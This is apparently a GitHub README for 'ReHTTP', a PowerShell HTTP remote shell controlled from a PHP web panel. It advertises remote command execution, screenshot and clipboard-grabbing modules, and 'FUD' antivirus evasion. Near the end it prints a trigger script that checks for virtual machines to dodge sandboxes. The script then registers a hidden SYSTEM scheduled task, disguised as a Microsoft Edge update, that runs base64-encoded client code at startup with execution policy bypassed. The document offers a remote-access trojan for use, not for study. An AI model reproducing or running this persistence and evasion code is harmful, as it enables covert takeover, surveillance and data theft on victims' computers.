




﻿
<h3 align="center"><img src="https://s28.picofile.com/file/8463031418/favicon.png" alt="logo" height="250px"></h3>
<p align="center">
    <b>ReHTTP</b><br>
    </p>
<hr>
<p align="center">
  <b> Simple Powershell Http shell With WEB UI </b>
    </p>
<p align="center">
  <a href="https://php.net">
    <img src="https://img.shields.io/badge/php-8.0.7-green" alt="php">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/platform-Windows-red">
  </a>
 

   

  
</p>
<p><img src="https://s28.picofile.com/file/8463024792/main.png" alt="enter image description here"></p>
<h2 id="shell">🤟 Main</h2>

<ul>
<li>Client list</li>
<li>System Info</li>
<li>Client Status</li>
<li>Set Label</li>
<li>Remove Client</li>
<li>Module</li>
<li>Variable</li>
<li>Event</li>
</ul>
<h2 id="shell">💎 Shell</h2>
<p><img src="https://s29.picofile.com/file/8463025868/shell.png" alt="shell tab demo">
<br></p>
<b>Run Powershell Command And You Can Add Command in Scheduled  </b>
<ul>
<li>Shell Access</li>
</ul>
<h2 id="Module">📟 Module</h2>
<p align="center"><img src="https://s29.picofile.com/file/8463025900/modules.png" alt="enter image description here"></p>
<p align="center"><img src="https://s29.picofile.com/file/8463026284/screenshot.png" alt="enter image description here"></p>
<p align="center"><img src="https://s29.picofile.com/file/8463026126/edi.png" alt="enter image description here"></p>
<b>Run Powershell Code as Function Or Module </b></p>
<pre>note : for use template edit $SERVER_URL in Code</pre>
<ul>
<li>Add Module</li>
<li>Edit Module</li>
<li>Delete Module</li>
--------------templates-----------------------
<li>Beep Sound</li>
<li>MessageBox</li>
<li>Download Current Background</li>
<li>Get System IdleTime</li>
<li>Get System LastInput</li>
<li>Get Public IP</li>
<li>Get-Clipboard</li>
<li>Set-Clipboard</li>
<li>Screenshot</li>
<li>OpenLink</li>
</ul>
<h2 id="Module">🧮 Variable</h2>
<p align="center"><img src="https://s29.picofile.com/file/8463026176/variable.png" alt="enter image description here"></p>

<p align="center"><img src="https://s29.picofile.com/file/8463026184/variables.png" alt="enter image description here"></p>
<b>Run PHP Code as Variable And Use In PowerShell Script</b></p>
<ul>
<li>Add Variable</li>
<li>Edit Variable</li>
<li>Delete Variable</li>
--------------templates-----------------------
<li>random</li>
</ul>
<h2 id="History">📜 History</h2>
<p><img src="https://s29.picofile.com/file/8463026276/history.png" alt="enter image description here"></p>
<b>if Your Client Break You Can Remove Last Command /:</b></p>
<ul>
<li>Show Command And Module</li>
<li>Remove Command</li>
<li>Re Execute Command</li>
</ul>
<h2 id="History">🪄 Event</h2>
<p align="center"><img src="https://s29.picofile.com/file/8463026318/event.png" alt="enter image description here"></p>
<b>Run Custom Command </b></p>
<ul>
<li>First Connection ( Init )</li>
<li>Every Connection ( UP )</li>
<li>Destroy ( Destroy )</li>
</ul>
<h2 id="dependency">🛠 Dependency</h2>
<ul>
<li>PHP 5.4 And Higher</li>
<li>Mysql</li>
</ul>
<h2 id="Antivirus">🦠 Antivirus</h2>
<p><img src="https://s29.picofile.com/file/8463026484/fD0Idrg5jVZx.pnل" alt="enter image description here"></p>
<b>FUD Scan Time + Run Time :)</b>
<h2 id="installation-and-usage">💿 Installation And Usage</h2>
<p>1- Edit $SERVER_URL in Client.ps1</p>
<p>2- Run ps1 script</p>
<p>3- Create Database </p>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">git</span> clone https://github.com/jxroot/ReHTTP.git
<span class="token function">cd</span> ReHTTP/Server/
php -S 127.0.0.1:8000 
</code></pre>
<p align="center"><img src="https://s29.picofile.com/file/8463060076/setup.png" alt="enter image description here"></p>
Triger Example For Client
<pre class=" language-bash"><code class="prism  language-bash">
# check Anti vm (vmware \ virtual box)
$VM=get-wmiobject win32_computersystem |select -ExpandProperty Model
if(($VM -NotLike "*VMware*") -and ($VM -NotLike "VirtualBox")){
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ' -exec bypass -c BASE64_CODE_CLIENT' 
$trigger = New-ScheduledTaskTrigger -AtStartup 
$settings = New-ScheduledTaskSettingsSet -Hidden
$user = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest  
Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUAS" -TaskPath "\"  -Action $action -Settings $settings -Trigger $trigger -Principal $user
Start-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUAS" 
}</code></pre>
<h2 id="operating-systems-tested">💻 Operating Systems Tested</h2>
<ul>
<li>Windows 7</li>
<li>Windows 10</li>
<li>Windows 11</li>
</ul>
<h2 id="youtube-tutorials">📹 YouTube Tutorials</h2>
<p><a href="a.com">How Install And Usage ReHTTP</a></p>
<h2 id="next-update">🔱 Next Update</h2>
<ul>
<li>fix  ui bugs</li>
<li>clean code </li>
<li>add event for distroy</li>
<li>add multi exec command for client</li>
<li>upload and  download module</li>
<li>async command</li>
<li>scheduled task ( Date )</li>
<li>background task </li>
<li>ui for system information and manage like hiorbit</li>
<li>add file manager </li>
<li>security (xss,csrf,rce,login page,...)</li>
</ul>
<h2 id="contact">📧 Contact</h2>
<p >
<a href="https://t.me/amajax"><img title="Telegram" src="https://img.shields.io/badge/Telegram-black?style=for-the-badge&logo=Telegram"></a>
<a href="https://www.youtube.com/channel/UC0-QcOXgzRgSfcE3zerwu9w/?sub_confirmation=1"><img title="Youtube" src="https://img.shields.io/badge/Youtube-red?style=for-the-badge&logo=Youtube"></a>
<a href="https://www.instagram.com/sectoolfa"><img title="Instagram" src="https://img.shields.io/badge/Instagram-white?style=for-the-badge&logo=Instagram"></a>

